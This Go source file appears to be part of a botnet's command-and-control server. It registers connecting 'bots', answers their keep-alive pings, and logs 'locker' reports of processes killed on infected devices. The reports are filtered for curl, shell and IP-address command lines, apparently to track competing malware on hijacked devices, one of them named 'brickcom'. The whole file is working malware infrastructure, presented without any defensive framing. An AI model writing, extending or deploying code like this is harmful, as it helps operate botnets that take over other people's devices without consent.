package clients

import (
	"cnc/internal/clients/packet"
	"cnc/pkg/logging"
	"encoding/binary"
	"net"
	"regexp"
	"strings"
	"time"
)

func (bot *Bot) Handle() {
	if err := bot.sanitizeName(); err != nil {
		logging.Global.Debug().Str("name", bot.Name).IPAddr("address", bot.Address).Msg("Remote had an invalid client name")
		// Invalid bot name probably, we'll just bail out. We don't want very weird bots.
		return
	}

	// add bot and delete after no more bot
	Add(bot)
	defer Delete(bot)

	// handle keep alive packets
	for {
		_ = bot.Conn.SetDeadline(time.Now().Add(180 * time.Second))

		hdr, body, err := bot.Read(-1)
		if err != nil {
			return
		}

		// Maybe add actual handlers for this? lol
		switch hdr.Op {
		case OpPing:
			if err := bot.Transmit(OpPing, packet.New()); err != nil {
				return
			}
		case OpLockerMsg:
			if !body.Readable(new(uint8), new(uint32), new(string)) {
				continue
			}

			var killType = body.ParseInt8()
			var processId = body.ParseInt32()
			var path = body.ParseString()

			switch killType {
			case 0:
				if bot.Name == "brickcom" {
					continue
				}

				if strings.Contains(path, "-q") ||
					strings.HasPrefix(path, "/bin/sh") ||
					strings.HasPrefix(path, "curl") ||
					strings.HasPrefix(path, "sh") ||
					strings.HasPrefix(path, "/mnt/data/targettools") ||
					strings.Contains(path, "check_goahead") {
					continue
				}

				if !containsIPAddress(path) {
					continue
				}

				if len(path) < 4 {
					continue
				}

				logging.Global.Info().
					Str("name", bot.Name).
					IPAddr("address", bot.Address).
					Str("cmdline", strings.TrimSpace(path)).
					Int("pid", processId).
					Msg("Received message")
			case 1:
				logging.Global.Info().
					Str("name", bot.Name).
					IPAddr("address", bot.Address).
					Str("path", path).
					Int("pid", processId).
					Msg("Killed process")
			}
		default:
			continue
		}
	}
}

func (bot *Bot) IsTrafficEncrypted() bool {
	return bot.State >= StateVerifyExchange
}

func containsIPAddress(s string) bool {
	ipv4Pattern := `\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b`
	re := regexp.MustCompile(ipv4Pattern)
	return re.MatchString(s)
}

func Int32ToIPv4(ipInt int) net.IP {
	ipBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(ipBytes, uint32(ipInt))
	return ipBytes
}
